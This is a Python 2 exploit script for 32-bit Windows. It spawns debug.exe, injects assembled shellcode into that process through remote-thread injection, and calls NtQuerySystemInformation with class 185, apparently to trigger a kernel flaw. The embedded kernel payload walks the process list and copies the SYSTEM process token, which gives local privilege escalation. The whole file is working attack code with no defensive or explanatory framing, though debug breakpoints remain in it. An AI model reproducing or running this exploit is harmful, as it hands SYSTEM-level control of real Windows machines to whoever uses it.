from ctypes import *
from ctypes.wintypes import *
import sys, struct, os, time
from keystone import *

### WinAPI Shorthand ###
NtQuerySystemInformation = windll.ntdll.NtQuerySystemInformation
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.VirtualAllocEx
VirtualAlloc = windll.kernel32.VirtualAlloc
WriteProcessMemory = windll.kernel32.WriteProcessMemory
CreateRemoteThread = windll.kernel32.CreateRemoteThread
CreateProcess = windll.kernel32.CreateProcessW
RtlMoveMemory = windll.kernel32.RtlMoveMemory

### Globals ###
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

### Bitmasks ###
PROCESS_ALL_ACCESS = 0x1fffff
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
CREATE_NEW_CONSOLE = 0x00000010

class STARTUPINFO(Structure):
    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

def makeASM(pid):
    phandle = OpenProcess(PROCESS_ALL_ACCESS, 0x0, pid)
    bytearrayz = addressof(create_string_buffer('0x00'))

    print "[*]Allocating kernel payload"
    shellcode = (
    "\xc7\x43\x04\x00\x00\x00\x00\x81\xc4\x0c"
    "\x00\x00\x00\x81\xc4\x04\x00\x00\x00\x5f"
    "\x5e\x5b\x89\xec\x5d\x81\xc4\x0c\x00\x00"
    "\x00\x81\xc4\x04\x00\x00\x00\x5e\x5b\x5f"
    "\x89\xec\x5d\x81\xc4\x04\x00\x00\x00\x81"
    "\xc4\x04\x00\x00\x00\x5f\x5e\x5b\x89\xec"
    "\x5d\x81\xc4\x04\x00\x00\x00\x81\xc4\x04"
    "\x00\x00\x00\x5f\x5f\x5e\x5b\x89\xec\x5d"
    "\x60\x64\xa1\x24\x01\x00\x00\xc7\x80\x3e"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xe8"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xec"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xf0"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xf4"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xf8"
    "\x01\x00\x00\x00\x00\x00\x00\xc7\x80\xfc"
    "\x01\x00\x00\x00\x00\x00\x00\x8b\x80\x50"
    "\x01\x00\x00\x81\xb8\x7c\x01\x00\x00\x63"
    "\x6d\x64\x2e\x74\x0d\x8b\x80\xb8\x00\x00"
    "\x00\x2d\xb8\x00\x00\x00\xeb\xe7\x89\xc3"
    "\x81\xb8\xb4\x00\x00\x00\x04\x00\x00\x00"
    "\x74\x0d\x8b\x80\xb8\x00\x00\x00\x2d\xb8"
    "\x00\x00\x00\xeb\xe7\x8b\x88\xfc\x00\x00"
    "\x00\x89\x8b\xfc\x00\x00\x00\x61\xc3\xff"
    "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
    "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
    "\xff\xff\xff\xff\xff\xff"
    )
    Kalloc = VirtualAllocEx(phandle, None, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    print "\t[+]Space allocated at %s" % hex(Kalloc)
    WriteProcessMemory(phandle, Kalloc, shellcode, len(shellcode), byref(c_ulong()))
    #RtlMoveMemory(Kalloc, shellcode, len(shellcode))
    print "\t[+]Kernel payload copied"

    CODE = (
    " start:                             "  #
    #"   int3                            ;"  #   Breakpoint for Windbg.
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 200h                 ;"  #
    "   call  find_ntdll                ;"  #

    " find_ntdll:                        "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+8h]             ;"  #   EBP = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+0b], cx            ;"  #   (unicode) modulename[9] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module.

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #
    "   sub esi, 054h                   ;"  #
    "   jmp resolve_symbols_ntdll       ;"  #

    " find_function:                     "  #
    "   pushad                          ;"  #    Save all registers
    "   mov   eax, [ebx+3ch]            ;"  #    Offset to PE Signature VMA
    "   mov   edi, [ebx+eax+78h]        ;"  #    Export table relative offset
    "   add   edi, ebx                  ;"  #    Export table VMA
    "   mov   ecx, [edi+18h]            ;"  #    Number of names
    "   mov   eax, [edi+20h]            ;"  #    Names table relative offset
    "   add   eax, ebx                  ;"  #    Names table VMA
    "   mov   [ebp-4], eax              ;"  #

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #    Jump to the end if ecx is 0
    "   dec   ecx                       ;"  #    Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #
    "   mov   esi, [eax+ecx*4]          ;"  #    Store the relative offset of the name
    "   add   esi, ebx                  ;"  #    Set esi to the VMA of the current name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #    Zero eax
    "   cdq                             ;"  #    Zero edx
    "   cld                             ;"  #    Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #    Load the next byte from esi into al
    "   test  al, al                    ;"  #    Test ourselves.
    "   jz    compute_hash_finished     ;"  #    If the ZF is set,we've hit the null term
    "   ror   edx, 0dh                  ;"  #    Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #    Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #    Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+24h]            ;"  #    Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #    No match, try the next one.
    "   mov   edx, [edi+24h]            ;"  #    Ordinals table relative offset
    "   add   edx, ebx                  ;"  #    Ordinals table VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #    Extrapolate the function's ordinal
    "   mov   edx, [edi+1ch]            ;"  #    Address table relative offset
    "   add   edx, ebx                  ;"  #    Address table VMA
    "   mov   eax, [edx+4*ecx]          ;"  #    Extract the relative function offset from its ordinal
    "   add   eax, ebx                  ;"  #    Function VMA
    "   mov   [esp+1ch], eax            ;"  #    Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #    Restore registers
    "   ret                             ;"  #

    " find_function_shorten_bnc:         "  #
    "   call find_function_ret          ;"  #

    " resolve_symbols_ntdll:             "
    "   push  0xe4e1cad6                ;"  #   NtQuerySystemInformation
    "   call  find_function             ;"  #
    "   mov   [ebp+14h], eax            ;"  #
    "   push  0xc53d4fdb                ;"  #   RtlZeroMemory
    "   call  find_function             ;"  #
    "   mov   [ebp+20h], eax            ;"  #
    "   push  0xcf14e85b                ;"  #   RtlMoveMemory
    "   call  find_function             ;"  #
    "   mov   [ebp+18h], eax            ;"  #
    "   push  0xe4e1cad6                ;"  #   NtQuerySystemInformation
    "   call  find_function             ;"  #
    "   mov   [ebp+1ch], eax            ;"  #
    "   push  0x73e2d87e                ;"  #   ExitProcess
    "   call  find_function             ;"  #
    "   mov   [ebp+1ch], eax            ;"  #

    " exec_shellcode:                    "
    #   First RtlZeroMemory
    "   push 0x%x                       ;"  #  Length:
    "   push 0                          ;"  #  : 4?
    #"   int3                            ;"  #
    "   call dword ptr [ebp+20h]        ;"  #  Call first RtlZeroMemory

    #   First NtQuerySystemInformation 
    "   push 8                          ;"  #  SystemInformationLength
    "   push 0x%x                          ;"  #  SystemInformation
    "   push 185                        ;"  #  SystemInformationClass: 185
    "   int3                            ;"  #
    "   call dword ptr [ebp+14h]        ;"  #  Call first NtQuerySystemInformation

    #   RtlMoveMemory
    "   push 0x%x                   ;"  #   Length: size of shellcode
    "   push 0x%x                   ;"  #   Source: shellcode
    "   push 0                      ;"  #   Destination: 0
    "   int3                        ;"
    "   call dword ptr [ebp+18h]    ;"  #   Call RtlMoveMemory

    #   Second NtQuerySystemInformation 
    "   push 8                          ;"  #  SystemInformationLength
    "   push 0                          ;"  #  SystemInformation
    "   push 185                        ;"  #  SystemInformationClass: 185
    "   call dword ptr [ebp+14h]        ;"  #  Call second NtQuerySystemInformation
    ) % (len(shellcode), Kalloc, len(shellcode), Kalloc)

    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
    print "[*]Encoded %d instructions" % count

    sh = ""
    for e in encoding:
        sh += struct.pack("B", e)
        shellcode = bytearray(sh)

    buf = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = VirtualAllocEx(phandle, None, 4096, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
    WriteProcessMemory(phandle, ptr, buf, len(shellcode), byref(c_ulong()))
    #RtlMoveMemory(ptr, buf, len(shellcode))
    print "\t[+]Whole payload located at address %s" % hex(ptr)
    raw_input("...ENTER TO EXECUTE SHELLCODE...")

    startthread = CreateRemoteThread(phandle, None, None, ptr, None, None, None)
    print "\t[+]Remote thread started"
    return ptr, shellcode,phandle

def inject(pid, ptr, shellcode, phandle):
    print "[*]Getting handle on debug.exe"
    print "\t[+]Got handle"

    #alloc = VirtualAllocEx(phandle, None, 4096, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
    #print "\t[+]Last alloc located at address %s" % hex(alloc)
    #res = WriteProcessMemory(phandle, alloc, ptr, len(shellcode), byref(c_ulong()))
    #if not res or res == 0:
    #    print"\t[-]Error writing: " + FormatError()
    #    sys.exit(-1)
    #print "\t[+]Shellcode located at address %s" % hex(alloc)
    raw_input("...ENTER TO EXECUTE SHELLCODE...")

    startthread = CreateRemoteThread(phandle, None, None, ptr, None, None, None)
    print "\t[+]Remote thread started"

def spawnDebug():
    print "[*]Spawning debug process"
    lpApplicationName = u"c:\\windows\\system32\\debug.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\debug.exe" # Unicode
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    processID = CreateProcess(lpApplicationName, lpCommandLine, None, None, 0, CREATE_NEW_CONSOLE, None, None,
                byref(lpStartupInfo), byref(lpProcessInformation))
    if not processID:
        print "\t[-]Error spawning debug: " + FormatError()
        sys.exit(-1)

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    pid = lpProcessInformation.dwProcessId
    return pid

if __name__ == "__main__":
    pid = spawnDebug()
    ptr, shellcode, phandle= makeASM(pid)
    inject(pid, ptr, shellcode, phandle)
